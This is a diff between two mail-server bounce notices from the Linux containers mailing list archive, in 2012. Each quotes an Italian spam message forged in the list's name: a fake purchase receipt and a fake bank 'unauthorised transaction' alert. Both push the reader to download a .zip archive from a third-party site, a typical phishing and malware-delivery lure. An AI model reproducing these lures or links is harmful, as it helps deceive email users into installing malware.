@@ -1,9 +1,9 @@
-From: MAILER-DAEMON-aMQy6wRqTTJuVBGQkuy7rw@public.gmane.org (Mail Delivery System)
+From: MAILER-DAEMON-rdaee1idGQifif5w+/xezSP3Fh2WBJwC@public.gmane.org (Mail Delivery System)
 Subject: Undelivered Mail Returned to Sender
-Date: Wed,  9 May 2012 10:39:31 +0200 (CEST)
-Message-ID: <20120509083931.DE066A5C490@presentaweb.be>
+Date: Wed,  9 May 2012 21:57:01 +0200 (CEST)
+Message-ID: <20120509195701.E62E9C41EA@smtpauth.interhost.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============7086158120154430730=="
+Content-Type: multipart/mixed; boundary="===============7625967246651836304=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -19,18 +19,18 @@ List-Id: containers.vger.kernel.org
 
 This is a MIME-encapsulated message.
 
---===============7086158120154430730==
+--===============7625967246651836304==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="88588A5C48C.1336552771/presentaweb.be"
+	boundary="4AD8FC4179.1336593421/smtpauth.interhost.it"
 Content-Transfer-Encoding: 7bit
 
 This is a MIME-encapsulated message.
 
---88588A5C48C.1336552771/presentaweb.be
+--4AD8FC4179.1336593421/smtpauth.interhost.it
 Content-Description: Notification
 Content-Type: text/plain; charset=us-ascii
 
-This is the mail system at host presentaweb.be.
+This is the mail system at host smtpauth.interhost.it.
 
 I'm sorry to have to inform you that your message could not
 be delivered to one or more recipients. It's attached below.
@@ -42,86 +42,59 @@ delete your own text from the attached returned message.
 
                    The mail system
 
-<impresatoscano-PkbjNfxxIASonA0d6jMUrA@public.gmane.org>: host mx3.hotmail.com[65.54.188.72] said: 550
-    Requested action not taken: mailbox unavailable (in reply to RCPT TO
-    command)
+<aurelia.mucci-NO+ENkreYd8@public.gmane.org>: service unavailable. Command output: mittente non
+    corrispondente al dominioMessage content rejected
 
-<impresatrasporticiullocosimo-PkbjNfxxIASonA0d6jMUrA@public.gmane.org>: host mx3.hotmail.com[65.54.188.72]
-    said: 550 Requested action not taken: mailbox unavailable (in reply to RCPT
-    TO command)
-
---88588A5C48C.1336552771/presentaweb.be
+--4AD8FC4179.1336593421/smtpauth.interhost.it
 Content-Description: Delivery report
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns; presentaweb.be
-X-Postfix-Queue-ID: 88588A5C48C
+Reporting-MTA: dns; smtpauth.interhost.it
+X-Postfix-Queue-ID: 4AD8FC4179
 X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Wed,  9 May 2012 10:39:29 +0200 (CEST)
+Arrival-Date: Wed,  9 May 2012 21:57:01 +0200 (CEST)
 
-Final-Recipient: rfc822; impresatoscano-PkbjNfxxIASonA0d6jMUrA@public.gmane.org
-Original-Recipient: rfc822;impresatoscano-PkbjNfxxIASonA0d6jMUrA@public.gmane.org
+Final-Recipient: rfc822; aurelia.mucci-NO+ENkreYd8@public.gmane.org
+Original-Recipient: rfc822;aurelia.mucci-NO+ENkreYd8@public.gmane.org
 Action: failed
-Status: 5.0.0
-Remote-MTA: dns; mx3.hotmail.com
-Diagnostic-Code: smtp; 550 Requested action not taken: mailbox unavailable
+Status: 5.3.0
+Diagnostic-Code: x-unix; mittente non corrispondente al dominioMessage content
+    rejected
 
-Final-Recipient: rfc822; impresatrasporticiullocosimo-PkbjNfxxIASonA0d6jMUrA@public.gmane.org
-Original-Recipient: rfc822;impresatrasporticiullocosimo-PkbjNfxxIASonA0d6jMUrA@public.gmane.org
-Action: failed
-Status: 5.0.0
-Remote-MTA: dns; mx3.hotmail.com
-Diagnostic-Code: smtp; 550 Requested action not taken: mailbox unavailable
-
---88588A5C48C.1336552771/presentaweb.be
+--4AD8FC4179.1336593421/smtpauth.interhost.it
 Content-Description: Undelivered Message
 Content-Type: message/rfc822
 Content-Transfer-Encoding: 7bit
 
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-X-No-Relay: not in my network
-Received: from digitekz.mydommespace.com (digitekz.mydommespace.com [72.29.71.23])
-	by presentaweb.be (Postfix) with ESMTPA id 88588A5C48C;
-	Wed,  9 May 2012 10:39:29 +0200 (CEST)
-Received: from digitekz.mydommespace.com (cVK-83-72 [72.29.71.23]) by digitekz.mydommespace.com (mailer) with SMTP id GlDYTVlJxImy for <impresatavormina-PkbjNfxxIASonA0d6jMUrA@public.gmane.org>; Wed, 09 May 2012 04:43:33 -0400
-Date: Wed, 09 May 2012 04:43:33 -0400
-From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Message-ID: <83470166.81427258430076-i7H6Mm3uc2iCftTOJxzRb+t0WEYC+Q52AL8bYrjMMd8@public.gmane.org>
-To: <impresatavormina-PkbjNfxxIASonA0d6jMUrA@public.gmane.org>
-Subject: Ordinate da PlayGame GO||. Id508539.
+Received: from sitenow.co.nz (unknown [208.99.211.118])
+	by smtpauth.interhost.it (Postfix) with ESMTPA id 4AD8FC4179
+	for <aurelia.mucci-NO+ENkreYd8@public.gmane.org>; Wed,  9 May 2012 21:57:01 +0200 (CEST)
+Received: from [10.0.0.100] by sitenow.co.nz id STo391sFrmQ7; Wed, 09 May 2012 12:56:56 -0700
+Message-ID: <004001cd2e1d$e1c00700$6400000a-AH9seTFQ2VlBWQWeTLFoew@public.gmane.org>
+From: "devnull" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <aurelia.mucci-NO+ENkreYd8@public.gmane.org>
+Subject: BANK transazione non autorizzata.
+Date: Wed, 09 May 2012 12:56:56 -0700
 MIME-Version: 1.0
-Content-type: text/plain; charset=us-ascii
+Content-Type: text/plain;charset=utf-8
 Content-Transfer-Encoding: quoted-printable
 
 
 
 
-Gentile utente =20
-Grazie per aver ordinate da PlayGame GO||.
+Cari titolare del conto bancario,
 
-Il vostro riferimento di ordine e 175831-560285.
-Avrete bisogno di questo in corrispondenza.
-Ordine ero stato ricevuto ed attualmente e nel fase di elaborazione. =20
-=20
-Tale ricevuta non e prova di acquisto.=20
-Riceverete la fattura stampata via posta a indirizzo di fatturazione.=20
-
-Avete schelto la paga con la carta di credito XXXX-XXXX-XX38-3681=20
-La carta verra addebitata a somma di 671.48 EUR=20
-e "PlayGame GO||" apparira'  accanto alla tassa di vostra dichiarazione.=20
-L'informazione sul vostro acquisto=20
-http://quehacerhoypanama.com/riferire/riferire.zip
+L'operazione ACH, recentemente avviato dal vostro conto in banca, e stata=
+ respinta dall'Associazione dei pagamenti elettronici.
+Si prega di leggere il resoconto delle transazioni, cliccando sul link so=
+ttostante:
+http://rf-hydraulics.gr/conto/Document.zip
 
 
 
+--4AD8FC4179.1336593421/smtpauth.interhost.it--
 
---88588A5C48C.1336552771/presentaweb.be--
-
---===============7086158120154430730==
+--===============7625967246651836304==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -131,4 +104,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============7086158120154430730==--
+--===============7625967246651836304==--
